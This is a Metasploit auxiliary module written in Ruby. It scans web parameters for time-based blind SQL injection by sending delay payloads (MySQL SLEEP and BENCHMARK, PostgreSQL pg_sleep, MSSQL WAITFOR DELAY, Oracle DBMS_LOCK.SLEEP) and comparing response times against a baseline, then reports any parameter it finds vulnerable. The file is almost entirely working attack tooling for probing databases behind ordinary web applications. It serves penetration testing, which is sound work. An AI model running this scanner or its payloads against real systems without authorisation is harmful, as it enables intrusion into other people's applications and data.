##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTTP SQL Injection Time-Based Blind Scanner',
      'Description'    => %q{
        This module detects time-based blind SQL injection vulnerabilities by
        measuring response times when sleep/delay functions are injected.
        Supports MySQL, PostgreSQL, MSSQL, and Oracle databases.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://owasp.org/www-community/attacks/Blind_SQL_Injection']
        ]
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI to test', '/']),
      OptString.new('PARAMETERS', [true, 'Parameters to test (comma-separated)', 'id']),
      OptString.new('COOKIE', [false, 'Cookie header for authentication', '']),
      OptString.new('GET_PARAMS', [false, 'Additional GET parameters', '']),
      OptInt.new('SLEEP_TIME', [true, 'Time to sleep in seconds', 5]),
      OptFloat.new('THRESHOLD', [true, 'Time difference threshold multiplier', 0.7]),
      OptInt.new('BASELINE_SAMPLES', [true, 'Number of baseline requests', 3]),
      OptEnum.new('DBMS', [false, 'Target DBMS (auto-detect if not set)', 'auto', 
                  ['auto', 'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']]),
      OptBool.new('VERBOSE', [false, 'Enable verbose output', false])
    ])
  end

  def run_host(ip)
    @sleep_time = datastore['SLEEP_TIME']
    @threshold = @sleep_time * datastore['THRESHOLD']
    
    print_status("=" * 70)
    print_status("Time-Based Blind SQL Injection Scanner")
    print_status("=" * 70)
    print_status("Target: #{ip}:#{rport}#{normalize_uri(target_uri.path)}")
    print_status("Sleep time: #{@sleep_time}s, Threshold: #{@threshold}s")
    print_status("=" * 70)
    print_status("")
    
    # Test connection
    unless test_connection
      print_error("Cannot connect to target")
      return
    end
    
    # Get parameters to test
    params = datastore['PARAMETERS'].split(',').map(&:strip)
    
    params.each do |param|
      print_status("-" * 70)
      print_status("Testing parameter: #{param}")
      print_status("-" * 70)
      test_parameter(param)
      print_status("")
    end
  end

  def test_connection
    begin
      res = send_test_request(datastore['PARAMETERS'].split(',').first.strip, '1')
      if res
        print_good("Connection successful - Response code: #{res.code}")
        return true
      end
    rescue => e
      vprint_error("Connection test failed: #{e.message}")
    end
    false
  end

  def test_parameter(param)
    # Determine which DBMS payloads to use
    if datastore['DBMS'] == 'auto'
      dbms_list = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']
    else
      dbms_list = [datastore['DBMS']]
    end
    
    vulnerable = false
    
    dbms_list.each do |dbms|
      vprint_status("Testing #{dbms} payloads...")
      
      payloads = generate_payloads(dbms)
      
      payloads.each_with_index do |payload_info, idx|
        print_status("[#{idx + 1}/#{payloads.length}] #{payload_info[:name]}")
        
        if test_payload(param, payload_info[:payload])
          print_good("=" * 70)
          print_good("✓ VULNERABLE: Parameter '#{param}' is vulnerable!")
          print_good("  DBMS: #{dbms}")
          print_good("  Payload: #{payload_info[:payload]}")
          print_good("=" * 70)
          
          report_vuln(
            host: rhost,
            port: rport,
            proto: 'tcp',
            name: 'Time-Based Blind SQL Injection',
            info: "Parameter '#{param}' vulnerable with #{dbms} payload",
            refs: references
          )
          
          vulnerable = true
          break
        end
      end
      
      break if vulnerable
    end
    
    unless vulnerable
      print_error("✗ NOT VULNERABLE: Parameter '#{param}'")
    end
  end

  def test_payload(param, payload)
    # Measure baseline response time
    baseline_times = []
    
    vprint_status("Measuring baseline response time...")
    datastore['BASELINE_SAMPLES'].times do |i|
      begin
        start_time = Time.now
        res = send_test_request(param, '1')
        elapsed = Time.now - start_time
        
        unless res
          vprint_error("Baseline request #{i + 1} failed")
          return false
        end
        
        baseline_times << elapsed
        vprint_status("  Baseline #{i + 1}: #{elapsed.round(3)}s")
        
        sleep(0.5)  # Small delay between requests
      rescue => e
        vprint_error("Baseline request error: #{e.message}")
        return false
      end
    end
    
    # Calculate average baseline
    baseline_avg = baseline_times.sum / baseline_times.length.to_f
    vprint_status("Average baseline: #{baseline_avg.round(3)}s")
    
    # Send exploit payload
    vprint_status("Sending exploit payload...")
    begin
      start_time = Time.now
      res = send_test_request(param, payload)
      exploit_time = Time.now - start_time
      
      unless res
        vprint_error("Exploit request failed")
        return false
      end
      
      vprint_status("  Exploit time: #{exploit_time.round(3)}s")
      
      # Calculate time difference
      time_diff = exploit_time - baseline_avg
      
      print_status("  Baseline: #{baseline_avg.round(3)}s, Exploit: #{exploit_time.round(3)}s")
      print_status("  Difference: #{time_diff.round(3)}s (threshold: #{@threshold}s)")
      
      # Check if delay is significant
      if time_diff >= @threshold
        print_good("  ✓ Significant delay detected! (#{time_diff.round(2)}s)")
        return true
      else
        vprint_status("  ✗ No significant delay (got: #{time_diff.round(2)}s)")
        return false
      end
      
    rescue => e
      vprint_error("Exploit request error: #{e.message}")
      return false
    end
  end

  def generate_payloads(dbms)
    payloads = []
    sleep_time = @sleep_time
    
    case dbms
    when 'MySQL'
      payloads << {
        name: 'MySQL SLEEP - Basic',
        payload: "1' AND SLEEP(#{sleep_time})-- -"
      }
      
      payloads << {
        name: 'MySQL SLEEP - Subquery',
        payload: "1' AND (SELECT * FROM (SELECT(SLEEP(#{sleep_time})))a)-- -"
      }
      
      payloads << {
        name: 'MySQL SLEEP - Complex (SQLMap style)',
        payload: "1' AND (SELECT #{rand(1000..9999)} FROM (SELECT(SLEEP(#{sleep_time})))#{Rex::Text.rand_text_alpha(4)})-- -"
      }
      
      payloads << {
        name: 'MySQL IF-SLEEP',
        payload: "1' AND IF(1=1,SLEEP(#{sleep_time}),0)-- -"
      }
      
      payloads << {
        name: 'MySQL BENCHMARK',
        payload: "1' AND (SELECT BENCHMARK(#{sleep_time * 1000000},MD5('A')))-- -"
      }
      
    when 'PostgreSQL'
      payloads << {
        name: 'PostgreSQL pg_sleep',
        payload: "1' AND (SELECT pg_sleep(#{sleep_time}))-- -"
      }
      
      payloads << {
        name: 'PostgreSQL CASE-pg_sleep',
        payload: "1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(#{sleep_time}) ELSE pg_sleep(0) END)-- -"
      }
      
    when 'MSSQL'
      payloads << {
        name: 'MSSQL WAITFOR DELAY',
        payload: "1'; WAITFOR DELAY '0:0:#{sleep_time}'-- -"
      }
      
      payloads << {
        name: 'MSSQL WAITFOR DELAY - Alternative',
        payload: "1' WAITFOR DELAY '0:0:#{sleep_time}'-- -"
      }
      
      payloads << {
        name: 'MSSQL IF-WAITFOR',
        payload: "1'; IF(1=1) WAITFOR DELAY '0:0:#{sleep_time}'-- -"
      }
      
    when 'Oracle'
      payloads << {
        name: 'Oracle DBMS_LOCK.SLEEP',
        payload: "1' AND DBMS_LOCK.SLEEP(#{sleep_time}) IS NULL-- -"
      }
      
      payloads << {
        name: 'Oracle CASE-DBMS_LOCK',
        payload: "1' AND (CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(#{sleep_time}) ELSE NULL END) IS NULL-- -"
      }
    end
    
    payloads
  end

  def send_test_request(param, value)
    uri = normalize_uri(target_uri.path)
    
    # Build GET parameters
    vars_get = { param => value }
    
    # Add additional GET parameters
    if datastore['GET_PARAMS'] && !datastore['GET_PARAMS'].empty?
      datastore['GET_PARAMS'].split('&').each do |pair|
        k, v = pair.split('=', 2)
        vars_get[k] = v if k
      end
    end
    
    # Build headers
    headers = {}
    if datastore['COOKIE'] && !datastore['COOKIE'].empty?
      headers['Cookie'] = datastore['COOKIE']
    end
    
    if datastore['VHOST'] && !datastore['VHOST'].empty?
      headers['Host'] = datastore['VHOST']
    end
    
    begin
      res = send_request_cgi(
        'uri'      => uri,
        'method'   => 'GET',
        'vars_get' => vars_get,
        'headers'  => headers
      )
      
      return res
    rescue => e
      vprint_error("Request error: #{e.message}")
      return nil
    end
  end

  def vprint_status(msg)
    print_status(msg) if datastore['VERBOSE']
  end
  
  def vprint_good(msg)
    print_good(msg) if datastore['VERBOSE']
  end
  
  def vprint_error(msg)
    print_error(msg) if datastore['VERBOSE']
  end
end
                                         
                    
